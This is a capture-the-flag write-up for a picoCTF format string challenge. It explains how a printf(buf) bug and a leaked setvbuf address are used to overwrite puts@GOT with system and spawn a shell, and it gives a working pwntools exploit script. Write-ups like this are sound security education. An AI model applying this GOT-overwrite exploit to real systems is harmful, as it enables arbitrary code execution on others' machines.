# Format-String-3-Medium Writeup

**Flag:** `picoCTF{...}`

---

## Summary

This is a format string exploitation challenge. The binary prints user input directly with `printf(buf);` which allows us to control format specifiers. Combined with the leak of a libc function (`setvbuf`), we can calculate libc’s base address and overwrite a GOT entry to hijack execution.

Our goal: overwrite the GOT entry of `puts()` with the address of `system()`. Since the program later calls `puts("/bin/sh")`, this effectively becomes `system("/bin/sh")`, giving us shell access.

---

## Vulnerability

The core problem is this line in `main()`:

```c
fgets(buf, 1024, stdin);	
printf(buf);   // unsafe, directly controlled format string
```

This lets us:

1. Leak stack values using `%p`.
2. Write arbitrary values to arbitrary addresses using `%n` (or with pwntools’ `fmtstr_payload`).

Additionally, the `hello()` function leaks the address of `setvbuf` from libc:

```c
printf("... Here's the address of setvbuf in libc: %p\n", &setvbuf);
```

That gives us an info leak → libc base → system address.

---

## Exploitation Strategy

1. **Leak libc base**

   * The program gives us `setvbuf`’s address.
   * Subtract `libc.symbols["setvbuf"]` to get `libc.address`.

2. **Locate target functions**

   * GOT entry of `puts()` → `exe.got["puts"]`.
   * Address of `system()` → `libc.symbols["system"]`.

3. **Format string offset**

   * Send `%p` repeatedly until we find where our input lands on the stack.
   * In this case, the correct offset was around **38**.

4. **Overwrite puts\@GOT**

   * Use `fmtstr_payload` to replace `puts` with `system`.
   * Next time the binary calls `puts(normal_string)`, it actually executes `system("/bin/sh")`.

---

## Exploit

```python
from pwn import *

exe = ELF("./format-string-3")
libc = ELF("./libc.so.6")

def exploit(conn):
    response = conn.recv().decode("utf-8")
    response = response.split("0x")
    setvbuf_addr = int(response[1].strip(), 16)
    libc.address = setvbuf_addr - libc.symbols["setvbuf"]

    info("libc == %#x", libc.address)
    puts = exe.got["puts"]
    info("puts == %#x", puts)
    system = libc.symbols["system"]
    info("system == %#x", system)

    payload = fmtstr_payload(offset=38, writes={puts: system})
    conn.sendline(payload)
    conn.interactive()
```

---

## Final Notes

* Vulnerability = format string in `printf(buf)`.
* Leak of `setvbuf` → libc base → resolve `system()`.
* Overwrite `puts@GOT` with `system`. I ran into issues with getting SIGSEVs because I was overwriting the libc puts not the GOT puts. 
* When program calls `puts("/bin/sh")`, it actually calls `system("/bin/sh")`.